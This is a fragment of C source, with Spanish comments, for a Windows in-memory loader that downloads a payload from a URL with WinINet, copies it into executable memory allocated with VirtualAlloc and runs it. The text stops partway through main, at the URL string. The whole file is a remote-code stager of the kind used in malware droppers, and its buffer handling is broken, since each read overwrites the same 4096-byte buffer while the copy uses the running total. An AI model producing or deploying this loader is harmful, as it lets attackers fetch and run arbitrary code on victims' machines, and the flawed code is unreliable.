#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

void ExecuteInMemory(const char* url) {
    HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    BYTE buffer[4096];
    DWORD bytesRead;
    DWORD totalBytesRead = 0;

    // Descargar el ejecutable en la memoria
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        totalBytesRead += bytesRead;
    }

    // Ejecutar el código en la memoria
    PVOID exec = VirtualAlloc(0, totalBytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buffer, totalBytesRead);
    ((void(*)())exec)();

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main() {
    const char* url = "
